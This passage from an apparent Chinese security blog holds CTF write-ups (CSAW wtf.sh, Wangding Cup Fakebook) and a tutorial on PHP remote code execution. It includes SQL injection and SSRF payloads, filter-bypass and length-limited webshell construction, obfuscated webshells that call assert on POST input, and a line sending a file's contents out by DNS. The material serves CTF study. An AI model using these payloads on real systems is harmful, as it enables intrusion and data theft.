punctuation">:</span>d<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>text<span class="token punctuation">;</span></code></pre><p>(学Python去了,233</p><h1 id="CSAW-CTF-Qualification-Round-2016-wtf-sh"><a href="#CSAW-CTF-Qualification-Round-2016-wtf-sh" class="headerlink" title="CSAW CTF Qualification Round 2016 wtf.sh"></a>CSAW CTF Qualification Round 2016 wtf.sh</h1><p>据说这道题是这个比赛中最难的一个Web题</p><p>复现环境: </p><p>Windows10+<a href="https://blog.cindemor.com/post/ctf-fairy-1.html" target="_blank" rel="noopener">writeup</a>+BurpSuite+Firefox</p><p>这道题分为两个flag</p><p>题目目的: </p><blockquote><p>了解相关漏洞,了解Bash代码审计</p></blockquote><p>参考资料: </p><p><a href="https://blog.cindemor.com/post/ctf-fairy-1.html" target="_blank" rel="noopener">https://blog.cindemor.com/post/ctf-fairy-1.html</a></p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><ul><li>目录穿越</li><li>cookies欺骗</li></ul><p>第一个flag比较容易拿到<code>如果知道了思路的话</code></p><p>随便点开一篇文章<code>http://111.198.29.45:50295/post.wtf?post=K8laH</code></p><p>观察到<code>?post=</code>猜测存在<strong>文件包含</strong>或者<strong>目录穿越</strong>.使用<code>http://111.198.29.45:50295/post.wtf?post=../</code>得到源码,审计源码发现</p><p><img src="https://i.loli.net/2020/01/22/kBrgKJ4MYC59IZe.png" alt></p><p>只要<code>username=admin,并且cookie也是admin的cooke</code>就能执行<code>$get_flag1</code>拿到第一个flag,于是下面就需要进行cookie欺骗.但是怎么去欺骗?首先需要得到admin的cookie啊,在源码中搜索<code>users</code>,可以看到有<code>users_lookup</code>和<code>users</code>和<code>get_users_posts</code>,从而知道存在users目录</p><p><code>?post=../users</code>得到admin的cookie,<code>右键查看源码得到tag</code></p><p><img src="https://i.loli.net/2020/01/22/G7ETPvNHDYkI58x.png" alt></p><p>Tips: </p><p>如果题目设置过滤掉<code>../</code>那么可以通过<code>..././</code>来进行绕过(备忘录</p><p>cookie欺骗不光只需要改cookie,有的时候关于这个用户的信息都要填上去</p><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><ul><li>代码审计</li><li>后门利用</li></ul><p>在做题过程中,在response中一直在变化bash的提示,比如<code>X-Bash-Fact: Bash has an</code>until<code>keyword, which is equivalent to</code>while not<code>.</code></p><p>访问<code>http://111.198.29.45:50295/wtf.sh</code>得到linux脚本代码,也可以直接在之前源码泄露的地方进行代码审计</p><pre class=" language-bash"><code class="language-bash">max_page_include_depth<span class="token operator">=</span>64page_include_depth<span class="token operator">=</span>0<span class="token keyword">function</span> include_page <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true"># include_page pathname</span>    local pathname<span class="token operator">=</span><span class="token variable">$1</span>    local cmd<span class="token operator">=</span>    <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${pathname(-4)}</span> <span class="token operator">=</span> <span class="token string">'.wtf'</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> // 这就是为什么需要%09的原因    local can_execute<span class="token operator">=</span>$<span class="token punctuation">;</span>    page_include_depth<span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$page_include_depth<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$page_include_depth</span> -lt <span class="token variable">$max_page_include_depth</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">then</span>        local line<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token function">read</span> -r line<span class="token punctuation">;</span> <span class="token keyword">do</span>            <span class="token comment" spellcheck="true"># check if we're in a script line or not ($ at the beginning implies script line)</span>            <span class="token comment" spellcheck="true"># also, our extension needs to be .wtf</span>            <span class="token punctuation">[</span><span class="token punctuation">[</span> $ <span class="token operator">=</span> <span class="token variable">${line01}</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">${can_execute}</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            is_script<span class="token operator">=</span>$<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true"># execute the line.</span>            <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$is_script</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token keyword">then</span>                cmd+<span class="token operator">=</span>$<span class="token string">'n'</span>$<span class="token punctuation">{</span>line<span class="token comment" spellcheck="true">#$};</span>            <span class="token keyword">else</span>                <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> -n <span class="token variable">$cmd</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>                <span class="token keyword">then</span>                    <span class="token function">eval</span> <span class="token variable">$cmd</span>  log Error during execution of <span class="token variable">${cmd}</span><span class="token punctuation">;</span>                    cmd<span class="token operator">=</span>                <span class="token keyword">fi</span>                <span class="token keyword">echo</span> <span class="token variable">$line</span>            <span class="token keyword">fi</span>        <span class="token keyword">done</span>  <span class="token variable">${pathname}</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> pMax include depth exceeded<span class="token operator">!</span>p    <span class="token keyword">fi</span><span class="token punctuation">}</span></code></pre><p>审计后发现可以执行wtf文件,此时如果能够上传wtf文件就可以getshell</p><p>继续审计代码</p><pre class=" language-bash"><code class="language-bash">    <span class="token keyword">function</span> reply <span class="token punctuation">{</span>        local post_id<span class="token operator">=</span><span class="token variable">$1</span><span class="token punctuation">;</span>        local username<span class="token operator">=</span><span class="token variable">$2</span><span class="token punctuation">;</span>        local text<span class="token operator">=</span><span class="token variable">$3</span><span class="token punctuation">;</span>        local hashed<span class="token operator">=</span><span class="token punctuation">$(</span>hash_username <span class="token string">"<span class="token variable">${username}</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        curr_id<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token keyword">for</span> d <span class="token keyword">in</span> posts/$<span class="token punctuation">{</span>post_id<span class="token punctuation">}</span>/*<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">basename</span> $d<span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">|</span> <span class="token function">sort</span> -n <span class="token operator">|</span> <span class="token function">tail</span> -n 1<span class="token variable">)</span></span><span class="token punctuation">;</span>        next_reply_id<span class="token operator">=</span><span class="token punctuation">$(</span>awk <span class="token string">'{print <span class="token variable">$1</span>+1}'</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"<span class="token variable">${curr_id}</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        next_file<span class="token operator">=</span><span class="token punctuation">(</span>posts/<span class="token variable">${post_id}</span>/<span class="token variable">${next_reply_id}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${username}</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">${next_file}</span>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"RE: $(nth_line 2 &lt; "</span>posts/<span class="token variable">${post_id}</span>/1<span class="token string">")"</span> <span class="token operator">>></span> <span class="token string">"<span class="token variable">${next_file}</span>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${text}</span>"</span> <span class="token operator">>></span> <span class="token string">"<span class="token variable">${next_file}</span>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"># add post this is in reply to to posts cache</span>        <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${post_id}</span>/<span class="token variable">${next_reply_id}</span>"</span> <span class="token operator">>></span> <span class="token string">"users_lookup/<span class="token variable">${hashed}</span>/posts"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>其中<code>echo &quot;${username}&quot; &gt; &quot;${next_file}&quot;;</code> 把用户名写入了评论文件中</p><blockquote><p>所以如果用户名是一段可执行的代码,格式为wtf,那么就可以成功利用</p></blockquote><p>创建一个用户名为<code>${find,/,-name,get_flag2}</code>的用户</p><p>获取flag2的路径为<code>/usr/bin/get_flag2</code></p><p><img src="https://i.loli.net/2020/01/22/NUlyj4aXkVQeFoT.png" alt></p><p>得到flag2</p><p><img src="https://i.loli.net/2020/01/22/9XLlQ5ZJCW1Ud8F.png" alt></p><p>最终的flag,其实flag不重要了,学习更多的姿势才重要</p><pre><code>xctf{cb49256d1ab48803149e5ec49d3c29ca}</code></pre><p>有感而发,Web狗要学(了解)的东西真多,最近做题发现要知道<code>Perl</code>,<code>Bash</code>,<code>Python web</code>,<code>Java Web</code>,<code>各种框架</code>….都有… <strong><em>路真的很长</em></strong>,学的效果也不知道怎么样,只能通过刷题增加见识和知识面了.</p><blockquote><p>多操作.</p></blockquote><h1 id="网鼎杯-2018-Fakebokk"><a href="#网鼎杯-2018-Fakebokk" class="headerlink" title="网鼎杯 2018 Fakebokk"></a>网鼎杯 2018 Fakebokk</h1><p>拿到题目,有两个功能点,一个是login一个是join,先随便注册一个账号,然后登陆,发现url为<code>/?no=1</code>,我先猜测的是存在文件包含漏洞,当输入文件包含的语句时,出现了SQL查询语句报错</p><p><img src="https://i.loli.net/2020/01/22/iSWLf2Ps6xNyZ1u.png" alt></p><p>思路于是转移到sql注入上去,第一次尝试构造<code>1&#39;union select 1,2,3#</code>出现语句报错而去掉那个<code>&#39;</code>后就可以正常的sqli了,后端代码可能是把变量no直接当做查询的变量(小白语录)….</p><p>后面直接按照正常的手工注入进行查询即可</p><p><strong>在url中++被当做空格处理</strong></p><p><img src="https://i.loli.net/2020/01/22/tBexMu6hlQ2z5ko.png" alt></p><p><img src="https://i.loli.net/2020/01/22/8sVPboku2H7UiD1.png" alt></p><p><img src="https://i.loli.net/2020/01/22/FmXyYI4PBDVCOHN.png" alt></p><p>从报错中我们可以看到有<code>unserizlize()</code>函数,可知在后端肯定是用了序列化来处理数据的,从的得到user的data的数据,是一个序列化后的数据</p><pre><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:19:&quot;http://hack-for.fun&quot;;}            </code></pre><p>然后做到这里可能就没思路了,<code>一直都在说,但一直都会忘记,或许在实战中,这也是一个非常重要的点,就是没有思路了就用一下robots.txt</code></p><p>进行目录扫描,确实存在<code>robots.txt</code>,进入其中的目录,down下源码</p><p>对源码进行审计发现,存在一个发起curl会话的<code>get($url)</code>,<a href="[http://hack-for.fun/2020/01/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0SSRF%E6%BC%8F%E6%B4%9E/#PHP-function](http://hack-for.fun/2020/01/20/一篇文章深入学习SSRF漏洞/#PHP-function)">从昨天的笔记中</a>讲到<code>curl_exec()</code>函数,这些函数<code>都必须当做敏感函数牢记在心!</code></p><p><img src="https://i.loli.net/2020/01/22/oirDOgdPRJcajkG.png" alt></p><p>好了,利用点就是<code>本地SSRF利用file协议读取文件</code>了,由于报错中已经给了我们地址</p><p><code>/var/www/html</code></p><p>所以,payload</p><p><code>http://111.198.29.45:46684/view.php?no=-1++union++select++1,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%22test%22;s:3:%22age%22;i:1;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27</code></p><p>右键查看源码后,在<code>&lt;iframe&gt;标签中的src属性中点击得到flag</code></p><p>so fun it is !  hack for fun !(fxxk,虽然今天差点被安洵杯easy_web气死,明天去网吧试试…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;i-got-id-200&quot;&gt;&lt;a href=&quot;#i-got-id-200&quot; class=&quot;headerlink&quot; title=&quot;i-got-id-200&quot;&gt;&lt;/a&gt;i-got-id-200&lt;/h1&gt;&lt;p&gt;知识点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Perl语言漏洞&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://hack-for.fun/categories/Writeup/"/>
    
      <category term="经典题目" scheme="https://hack-for.fun/categories/Writeup/%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/"/>
    
    
      <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="反序列化" scheme="https://hack-for.fun/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="SSRF" scheme="https://hack-for.fun/tags/SSRF/"/>
    
      <category term="Perl" scheme="https://hack-for.fun/tags/Perl/"/>
    
      <category term="目录穿越" scheme="https://hack-for.fun/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
    
      <category term="cookie欺骗" scheme="https://hack-for.fun/tags/cookie%E6%AC%BA%E9%AA%97/"/>
    
      <category term="后门利用" scheme="https://hack-for.fun/tags/%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
    
      <category term="Bash web server" scheme="https://hack-for.fun/tags/Bash-web-server/"/>
    
      <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章深入学习RCE漏洞</title>
    <link href="https://hack-for.fun/posts/20200117/"/>
    <id>https://hack-for.fun/posts/20200117/</id>
    <published>2020-01-17T12:43:26.304Z</published>
    <updated>2020-01-23T08:45:39.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言背景"><a href="#0x00-前言背景" class="headerlink" title="0x00  前言背景"></a>0x00  前言背景</h1><blockquote><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。<br>远程系统命令执行<br>一般出现这种漏洞，是因为应用系统从设计上需要给用户<strong>提供指定的远程命令操作的接口</strong>，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 ，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p><p>远程代码执行<br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了<strong>不安全的反序列化</strong>等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 </p></blockquote><p> 远程命令/代码执行漏洞(Remote Code/Command Execution Vulnerability)，用户通过<a href="https://baike.baidu.com/item/浏览器/213911" target="_blank" rel="noopener">浏览器</a>提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定<a href="https://baike.baidu.com/item/绝对路径/481185" target="_blank" rel="noopener">绝对路径</a>的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 </p><p>能造成这个漏洞的条件同样也是</p><ul><li>用户能够控制函数的输入</li><li>存在可以执行代码的危险函数</li></ul><p>远程代码执行只是执行PHP代码(只是针对PHP后端语言来说的话),而远程命令执行是执行cmd或者终端命令,是系统命令</p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><p>下面来看看最简单的代码示例: </p><p><strong>代码执行</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'what'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// echo $b;</span>    <span class="token delimiter">?></span></code></pre><p><code>eval()</code>函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p><img src="https://i.loli.net/2020/01/15/RGoXhN8DiIvfQSz.png" alt></p><p>我们提交url?what=phpinfo(); 就可以执行得到phpinfo界面,当然和eval函数类似的还有很多</p><p><strong>命令执行</strong></p><pre class=" language-PHP"><code class="language-PHP"><?php  $a = @shell_exec($_GET['what']);  echo $a;  ?></code></pre><p><img src="https://i.loli.net/2020/01/15/f4KvZDCcUNE5aRr.png" alt></p><p>可以看到,这里执行了系统cmd命令</p><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><p>关于RCE的基础知识,估计也就是PHP相关函数(也就是危险函数)的基础知识,Linux Windows常见的(在安全中)系统命令</p><h2 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h2><p><strong>PHP允许动态函数执行</strong>,这是很多高级RCE场景中常常利用的点</p><p><strong>eval()函数</strong></p><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p><img src="https://i.loli.net/2020/01/15/W1UvGkfR7QTrYgp.png" alt></p><p><strong>assert()函数</strong></p><p><img src="https://i.loli.net/2020/01/15/ZiMWXcIseBynkq2.png" alt></p><p><strong>preg_replace()+/e</strong></p><p>php版本&lt;5.5.0</p><p>如果preg_replace()的第一个参数中存在/e模式修饰符,则允许代码执行</p><p>现在已经被弃用,使用了preg_replace_callback()替代可能在CTF中会遇到</p><p><img src="https://i.loli.net/2020/01/15/3zZ1Xsqrt9FaeAI.png" alt></p><p><strong>system(), exec(), shell_exec, passthru, pcntl_exec, popen, proc_popen等</strong></p><p>这些函数是用于执行<code>command</code>命令的</p><p><img src="https://img2018.cnblogs.com/blog/1270588/201908/1270588-20190822193956941-300893444.png" alt></p><p><img src="https://img2018.cnblogs.com/blog/1270588/201908/1270588-20190822194007335-1556096688.png" alt></p><p><img src="https://img2018.cnblogs.com/blog/1270588/201908/1270588-20190822194017718-887173953.png" alt></p><p>还有 ``` `运算符可以执行其中的命令 反引号是PHP中最简单的执行shell的方法</p><h2 id="相关系统命令知识基础"><a href="#相关系统命令知识基础" class="headerlink" title="相关系统命令知识基础"></a>相关系统命令知识基础</h2><h3 id="Windows系统管道符"><a href="#Windows系统管道符" class="headerlink" title="Windows系统管道符"></a>Windows系统管道符</h3><p><img src="https://img-blog.csdnimg.cn/20190914170045697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt></p><p>;分号的作用是用来连续执行系统命令</p><h3 id="Linux系统管道符"><a href="#Linux系统管道符" class="headerlink" title="Linux系统管道符"></a>Linux系统管道符</h3><p><img src="https://img-blog.csdnimg.cn/20190914170106366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt></p><p><strong>ls命令</strong>,ls是list的缩写,可跟路径或者参数,表示列出路径或目录下所有文件信息 ls -I 显示当前路径下的所有文件及文件夹的详细信息</p><p><strong>cat命令</strong>,cat是concatenate的缩写,表示<strong>读取</strong>文件内容及拼接文件</p><p><strong>rm命令</strong>, re是remove的缩写,用于删除文件或者文件夹,-r删除目录 -f强制删除</p><p><strong>mkdir命令</strong>, 是make directory的缩写,用于创建文件夹.</p><p><strong>find命令</strong></p><blockquote><p> find   path   -option   [   -print ]   [ -exec   -ok   command ]   {} ;</p></blockquote><p>CTF常用 : find / -name flag</p><p><strong>grep命令</strong></p><p>grep命令用于查找文件里符合条件的字符串。</p><p>Linux下<strong>glob通配符</strong></p><blockquote><p>*可以代替0个及以上任意字符 </p><p>?可以代表1个任意字符</p></blockquote><p><strong>Linux shell</strong></p><blockquote><p>shell可以利用.来执行任意脚本</p><p>Linux文件名支持用glob通配符代替</p></blockquote><p>.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。</p><p>用. file执行文件，是不需要file<strong>有x权限的</strong>。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？</p><p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。</p><p>ascii码表中 大写字母位于<code>@</code>与<code>[</code>之间,使用glob通配符[@-[]就可以用来表示大写字母</p><h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02  漏洞原理"></a>0x02  漏洞原理</h1><p> 由于开发人员编写源码，没有针对代码中可执行的<a href="https://baike.baidu.com/item/特殊函数/10555419" target="_blank" rel="noopener">特殊函数</a>入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中<a href="https://baike.baidu.com/item/WEB服务器/8390210" target="_blank" rel="noopener">WEB服务器</a>没有过滤类似<a href="https://baike.baidu.com/item/system/15078602" target="_blank" rel="noopener">system</a>(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。 </p><p>RCE分类的话分为<strong>有回显</strong>和<strong>无回显</strong>两种情况</p><p>有回显的话也就不用过多结束了,就是payload打过去有结果输出,没输出就检查思路</p><p><strong>无回显的情况</strong>          </p><p>1)判断</p><p>利用延时</p><p><code>ls;sleep 3</code></p><p>http/dns请求</p><p>2)利用</p><p>写shell(直接带入/外部下载)</p><p>echo &gt;</p><p>wget 下载    </p><p>http/dns等方式带出数据,需要去掉空格,使用sed命令</p><pre><code>echo `cat flag.php|sed s/[[:space;]]//`.php.xxxx.eee.xyz                  </code></pre><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03  漏洞利用"></a>0x03  漏洞利用</h1><p>利用RCE,简单的就是读写文件,高级点的就是getshell</p><p>读写文件主要就是利用上面写到的一些命令或者代码,当然还有非常多其他的.需要在实践中继续发现利用总结.</p><p><strong>如何getshell?</strong></p><p><strong>挖掘漏洞的过程, 通常需要先找到危险函数, 然后回溯函数的调用过程, 最终看在整个调用的过程中是否有可能控制输入</strong></p><h1 id="0x04-bypass"><a href="#0x04-bypass" class="headerlink" title="0x04  bypass"></a>0x04  bypass</h1><h2 id="1-命令执行的分隔符"><a href="#1-命令执行的分隔符" class="headerlink" title="1)命令执行的分隔符"></a>1)命令执行的分隔符</h2><p>例子：<code>system(&quot;echo &quot;.$_GET[1]);</code></p><table><thead><tr><th align="center">功能</th><th align="center">符号</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">换行符</td><td align="center">%0a</td><td align="center">?1=123%0apwd</td></tr><tr><td align="center">回车符</td><td align="center">%0d</td><td align="center">同上</td></tr><tr><td align="center">连续指令</td><td align="center">;</td><td align="center">?1=123;pwd</td></tr><tr><td align="center">后台进程</td><td align="center">&amp;</td><td align="center">?1=123&amp;pwd</td></tr><tr><td align="center">管道符</td><td align="center">|(显示后面语句的结果)</td><td align="center">?1=123|pwd</td></tr><tr><td align="center">逻辑运算</td><td align="center">||或&amp;&amp;</td><td align="center">?1=123||pwd</td></tr></tbody></table><h2 id="2-空格代替"><a href="#2-空格代替" class="headerlink" title="2)空格代替"></a>2)空格代替</h2><ul><li>&lt;</li><li>$IFS</li><li>${IFS}</li><li>$IFS$9</li><li>%09(URL中)</li></ul><h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3)绕过过滤"></a>3)绕过过滤</h2><p>可以采用组合([<strong>拼接</strong>)的形式</p><p>如: a=l;b=s;$a$b   <strong>=&gt;</strong> ls</p><p><strong>编码</strong>绕过</p><pre><code>`echo d2hvYW1p|base64 -D`  =&gt; `echo whoami`</code></pre><p><strong>反斜杠</strong>绕过</p><p>ca\t /fl\ag <strong>=&gt;</strong> cat /flag</p><h2 id="4-绕过长度限制"><a href="#4-绕过长度限制" class="headerlink" title="4)绕过长度限制"></a>4)绕过长度限制</h2><p><strong>1、15个字符</strong></p><pre><code>echo  \&lt;?php &gt;1echo eval\(&gt;&gt;1echo \$_GET&gt;&gt;1echo \[1\]&gt;&gt;1echo \)\;&gt;&gt;1mv 1 1.php</code></pre><p><strong>2、7个字符</strong></p><p>思路：<br>1、<code>命令+&gt;文件名</code>可以生产文件(命令可以为空)<br>2、<code>ls -t</code>可以将文件按时间顺序排列<br>3、<code>sh</code>命令可以执行sh脚本<br>4、base64命令可以避免特殊字符<br>5、\可以分行输入命令</p><pre><code>w&gt;hpw&gt;1.p\\w&gt;d\&gt;\\w&gt;\ -\\w&gt;e64\\w&gt;bas\\w&gt;7\|\\w&gt;XSk\\w&gt;Fsx\\w&gt;dFV\\w&gt;kX0\\w&gt;bCg\\w&gt;XZh\\w&gt;AgZ\\w&gt;waH\\w&gt;PD9\\w&gt;o\ \\w&gt;ech\\ls -t|\sh</code></pre><h2 id="5-无字母数字webshell"><a href="#5-无字母数字webshell" class="headerlink" title="5)无字母数字webshell"></a>5)无字母数字webshell</h2><p>PHP5不能利用($a)();执行函数,PHP7可以</p><p><strong>主要思路: 利用位运算,自增运算符</strong></p><p><strong>对变量进行取反,异或</strong>,最后动态执行函数</p><p><strong>在PHP中,两个字符串执行异或操作异或以后,得到的还是一个字符串</strong></p><pre><code>$_=&#39;&lt;&gt;]=@^&lt;&#39;^&#39;[[){,?[&#39;;//$_=&#39;getFlag&#39;\n $_();//getFlag()</code></pre><p>比如绕过</p><pre class=" language-php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-0]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><strong>异或</strong></p><p>就需要找到两个非字母,数字的字符,使他们异或的结果是这个字母即可</p><p>PHP5中的一些现成payload(参考P神的文章)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%01'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%13'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%05'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%12'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%14'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='assert';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0D'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%2F'</span><span class="token operator">^</span><span class="token string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%0E'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'%09'</span><span class="token operator">^</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $__='_POST';</span><span class="token variable">$___</span><span class="token operator">=</span>$<span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// assert($_POST[_]);</span><span class="token delimiter">?></span></code></pre><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/b2ac8554-37f8-448e-bc79-b7213eb2cfb8.jpg" alt></p><p><strong>取反</strong></p><p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p><pre class=" language-PHP"><code class="language-PHP"><?php$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);?></code></pre><p>不得不佩服为什么P神这么牛了</p><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg" 